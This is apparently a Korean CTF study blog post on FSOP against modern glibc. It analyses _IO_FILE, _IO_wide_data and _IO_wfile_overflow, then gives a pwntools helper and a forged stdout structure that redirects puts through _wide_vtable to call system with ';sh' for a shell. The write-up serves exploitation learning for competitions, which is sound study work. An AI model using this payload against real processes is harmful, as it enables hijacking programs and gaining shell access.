이 세상에 FSOP 문제는 널리고 널렸지만 영어를 못하는 나는 질 좋은 FSOP 학습 자료를 볼 기회가 별로 없었다.

최근에 FSOP 문제가 너무나 눈에 띄었다. 2024 CCE Quals에서도 FSOP만 알고 있었다면 2시간 만에 풀 수 있었다. 특수한 상황에서만이 아니라, 일반적인(드림핵 4~6렙) 문제 접근에 성공하고 익스할 때, 항상 뭔가 막히면 FSOP 때문이었다.

FSOP까지만 제대로 알아도 든든한 웹이나 암호학 해커와 함께라면 2인으로도 청소년부 본선은 쉽게 갈 것 같다.

dreamhack-invitational-quals 채널에서 값진 문장 하나를 발견했다.

![](https://blogfiles.pstatic.net/MjAyNDEwMDhfMTEy/MDAxNzI4MzgyMTI0OTQx.c4dKOzCF48mwK2HPrs_Bn3XrTqRmaS9GWU4jeQCFl7Qg.im4cxWpwjrNbvScnCdsv17NQvkbVdoK9va1Rjv5upsMg.PNG/SE-96dbf2d6-529c-46e4-8fa2-0c672038f7d8.png?type=w1)


\_IO\_FILE 구조체와 \_IO\_wfile\_overflow에 대해 분석해보면 될 것 같다.

---

# \_IO\_wide\_data

glibc 버전이 높아지면서 vtable을 변조하면 IO_validate_vtable에 의해 걸리므로, \_wide\_vtable을 사용해야 한다.

\_IO\_FILE 구조체를 살펴보면

```javascript
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
struct _IO_wide_data *_wide_data;
```

여기에 _IO_wide_data 가 있음을 알 수 있다.

```javascript
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```

여기서 _wide_vtable을 확인할 수 있다. 즉, fp->_wide_data->_wide_vtable을 변조할 수 있다면 항상 익스 가능하다.

---

_IO_wfile_overflow

이제 함수를 분석해보자.

```javascript
wint_t
_IO_wfile_overflow (f, wch)
     _IO_FILE *f;
     wint_t wch;
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
      else
	{
	  ...
}
libc_hidden_def (_IO_wfile_overflow)
```

_IO_wdoallocbuf(f)를 실행시키고자 한다.

if (f->_flags & _IO_NO_WRITES) 를 만족하지 않아야 한다.

if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0) 를 만족해야 한다.

if (f->_wide_data->_IO_write_base == 0) 를 만족해야 한다.

모두 만족했다면, 해당 함수로 들어간다.

```javascript
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```

_IO_WDOALLOCATE (fp)를 실행시키고자 한다.

if (fp->_wide_data->_IO_buf_base) 를 만족하지 않아야 한다.

if (!(fp->_flags & _IO_UNBUFFERED)) 을 만족해야 한다. ( (fp->_flags & _IO_UNBUFFERED) == 0 )

이 때 _IO_WDOALLOCATE은 _IO_wide_data의 vtable을 참조하는 매크로이다. 따라서 FSOP가 성립한다.

문제에서 접근할 때, puts, write, scanf는 내부적으로 vtable의 함수를 호출하는데 이들을 잘 조작해서 _IO_wfile_overflow가 호출되도록 하면 된다. _IO_wfile_overflow는 _IO_validate_vtable에 걸리지 않는 유효한 범위에 있으므로 가능하다.

한 줄로 정리하자면 fp -> _wide_data(변조) -> _wide_vtable(변조) -> one_gadget or system with fp = ';sh'

---

puts를 기준으로 정리해보자.

```javascript
def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=fake_fsop_struct - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)
```

puts는 내부적으로 *vtable + 0x38에 있는 _IO_new_file_xsputn를 호출한다. 우리는 *_IO_wfile_jumps + 0x18에 있는 _IO_wfile_overflow을 호출할 것이므로, vtable을 *_IO_wfile_jumps - 0x20으로 하면 offset을 맞출 수 있다.

*_wide_data의 offset은 자유롭게 설정할 수 있지만, -0x10이 가장 무난해보인다. 이렇게 설정하면, _wide_vtable은 _unused2의 마지막 부분에 있게 되므로, 이를 *_IO_2_1_stdout_ - 0x8로 바꾼다. 여기서의 offset 또한 자유이지만 가장 직관적인 것을 선택했다.

_IO_WDOALLOCATE는 *wide_vtable + 0x68을 참조하는 매크로이다. 따라서 위와 같이 FSOP를 진행했다면 *_IO_2_1_stdout_ + 0x60(- 0x8 + 0x68)인 _markers 부분을 참조하는 것이다. 여기에 system함수나, one_gadget을 넣어 쉘을 딸 수 있다.